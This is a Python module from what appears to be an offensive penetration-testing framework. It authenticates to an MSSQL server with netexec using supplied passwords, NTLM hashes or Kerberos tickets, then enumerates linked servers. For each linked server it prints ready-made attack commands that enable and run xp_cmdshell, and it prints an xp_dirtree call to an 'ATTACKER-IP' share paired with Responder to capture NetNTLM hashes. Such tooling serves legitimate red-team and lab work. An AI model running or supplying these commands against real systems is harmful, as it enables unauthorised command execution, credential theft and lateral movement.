from pathlib import Path
from datetime import datetime
import subprocess

from core.paths import get_chain_artifacts_dir


def run(data, cred, args):

    G = '\033[92m'
    C = '\033[96m'
    B = '\033[94m'
    Y = '\033[93m'
    R = '\033[91m'
    W = '\033[0m'
    BOLD = '\033[1m'

    if not cred:

        print(
            f"\n{R}[!] {W}{BOLD}NO CREDENTIAL SELECTED{W}\n"
        )

        return data

    target = data.get("ip")

    username = cred["user"]
    auth_type = cred["type"]
    secret = cred["secret"]

    artifact_dir = get_chain_artifacts_dir(
        data["name"],
        "mssql"
    )

    artifact_dir.mkdir(
        parents=True,
        exist_ok=True
    )

    timestamp = datetime.now().strftime(
        "%Y%m%d_%H%M%S"
    )

    logfile = (
        artifact_dir /
        f"mssql_links_{timestamp}.log"
    )

    query = (
        "SELECT srvname,isremote "
        "FROM sysservers"
    )

    cmd = [
        "netexec",
        "mssql",
        target,
        "-u",
        username,
        "--local-auth",
        "-q",
        query,
        "--log",
        str(logfile)
    ]

    if auth_type == "password":

        cmd.extend(
            [
                "-p",
                secret
            ]
        )

    elif auth_type == "ntlm":

        cmd.extend(
            [
                "-H",
                secret
            ]
        )

    elif auth_type == "ticket":

        cmd.append(
            "--use-kcache"
        )

    print(
        f"\n{B}┌── {BOLD}MODULE: MSSQL LINKS{W}{B} ─────────────────────┐{W}"
    )

    print(
        f"{B}│{W}  {B}Target:{W} "
        f"{C}{target:<34}{W}"
        f"{B}│{W}"
    )

    print(
        f"{B}│{W}  {B}User:{W}   "
        f"{C}{username:<34}{W}"
        f"{B}│{W}"
    )

    print(
        f"{B}└────────────────────────────────────────────┘{W}"
    )

    print(
        f"\n{B}[*]{W} Running\n"
    )

    print(
        f"{Y}{' '.join(cmd)}{W}\n"
    )

    subprocess.run(
        cmd
    )

    if not logfile.exists():

        print(
            f"\n{R}[!] {W}No log file created\n"
        )

        return data

    log_text = logfile.read_text(
        errors="ignore"
    )


    #
    # PARSE
    #
    links = []

    for line in log_text.splitlines():

        if "srvname:" not in line:
            continue

        server = (
            line
            .split("srvname:", 1)[1]
            .strip()
        )

        if server:

            links.append(server)

    links = sorted(
        set(links)
    )

    if links:

        print(
            f"{Y}[!]{W} Linked Server Reference\n"
        )

        for server in links:

            print(
                f"  {B}# Check execution context{W}"
            )

            print(
                f"  {Y}EXECUTE('SELECT @@servername, SYSTEM_USER, "
                f"IS_SRVROLEMEMBER(''sysadmin'')') "
                f"AT [{server}];{W}\n"
            )

            print(
                f"  {B}# Execute command via linked server{W}"
            )

            print(
                f"  {Y}EXECUTE('xp_cmdshell ''whoami''') "
                f"AT [{server}];{W}\n"
            )

            print(
                f"  {B}# Enable xp_cmdshell (if sysadmin){W}"
            )

            print(
                f"  {Y}EXECUTE('sp_configure ''''show advanced options'''',1;"
                f"RECONFIGURE;"
                f"sp_configure ''''xp_cmdshell'''',1;"
                f"RECONFIGURE;') "
                f"AT [{server}];{W}\n"
            )

            print(
                f"  {B}# Capture NetNTLM via UNC path{W}"
            )

            print(
                f"  {Y}EXEC master..xp_dirtree "
                f"'\\\\ATTACKER-IP\\share\\';{W}"
            )

            print(
                f"  {Y}sudo responder -I tun0{W}\n"
            )

        

    else:

        print(
            f"\n{Y}[-]{W} No linked servers identified\n"
        )

    print()

    print(
        f"{G}[+] {W}Log Saved"
    )

    print(
        f"{B}  └── {C}{logfile}{W}\n"
    )

    return data